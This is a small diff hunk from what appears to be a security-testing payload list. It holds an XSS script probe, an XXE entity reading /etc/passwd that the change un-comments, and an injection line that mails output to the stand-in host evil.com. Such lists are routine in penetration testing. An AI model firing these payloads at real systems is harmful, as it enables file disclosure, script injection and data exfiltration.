@@ -25,7 +25,7 @@
 
 "><script>alert(1)</script>      # XSS
 
-# <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+"<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>" # Ohne ""
 
 " | mail -s pwn me@evil.com      # SMTP Inj.
 
